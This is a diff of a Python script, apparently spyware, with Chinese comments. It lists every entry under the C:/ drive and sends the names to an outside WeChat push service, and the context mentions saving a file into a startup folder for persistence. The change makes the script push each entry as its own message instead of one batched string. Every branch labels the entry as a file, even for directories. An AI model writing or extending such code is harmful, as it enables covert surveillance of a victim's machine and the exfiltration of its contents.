@@ -124,7 +124,6 @@ save_path = os.path.join(startup_folder_path, file_name)
 
 # 指定目录的路径
 directory_path = "C:/"
-str1 = ''
 
 # 获取指定目录的所有文件和文件夹
 items = os.listdir(directory_path)
@@ -133,13 +132,12 @@ items = os.listdir(directory_path)
 for item in items:
     item_path = os.path.join(directory_path, item)
     if os.path.isfile(item_path):
-        str1 += f"|{item}| 是一个文件 " + "<br>"
+        wechat_push.Alleged_information(f"|{item}| 是一个文件 " + "<br>")
     elif os.path.isdir(item_path):
-        str1 += f"|{item}| 是一个文件 " + "<br>"
+        wechat_push.Alleged_information(f"|{item}| 是一个文件 " + "<br>")
     else:
-        str1 += f"|{item}| 是一个文件 " + "<br>"
+        wechat_push.Alleged_information(f"|{item}| 是一个文件 " + "<br>")
 
-wechat_push.Alleged_information(f'{str1}')
 
 
 # # 使用os.path.exists()函数检查文件是否存在
